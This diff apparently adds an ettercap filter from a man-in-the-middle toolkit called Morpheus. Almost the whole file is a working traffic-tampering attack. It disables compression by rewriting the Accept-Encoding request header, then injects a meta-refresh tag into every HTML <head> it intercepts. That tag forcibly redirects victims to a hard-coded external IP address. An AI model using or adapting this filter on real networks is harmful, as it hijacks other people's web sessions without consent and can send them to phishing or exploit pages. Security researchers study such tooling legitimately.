@@ -1,0 +1,43 @@
+############################################################################
+#                                                                          #
+#  HTTPS Request/Response Filter                                           #
+#  based on code from ALoR & NaGA                                          #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+
+##
+#  This filter will redirect target requests under mitm
+#  attacks to the specified redirect url. <http-equiv>
+##
+
+
+##########################
+## Zap Content Encoding ##
+##########################
+if (ip.proto == TCP && tcp.dst == 80){
+   if (search(DATA.data, "Accept-Encoding")){
+    replace("Accept-Encoding", "Accept-Rubbish!");
+    msg("[Morpheus] target request Encoding zapped ✔");
+   }
+}
+
+
+#####################
+## Replace Content ##
+#####################
+if (ip.proto == TCP && tcp.src == 80){
+  if (search(DATA.data, "<head>")) {
+   msg("[morpheus] | dns_spoof: %1\n");
+
+    # redirect target to exploitdb by replacing <head> html tag with one redirection url
+    replace("<HEAD>", "<HEAD><META http-equiv='refresh' content='0;URL=https://31.192.120.44'>");
+    replace("<head>", "<head><meta http-equiv='refresh' content='0;URL=https://31.192.120.44'>");
+  }
+}
+
+
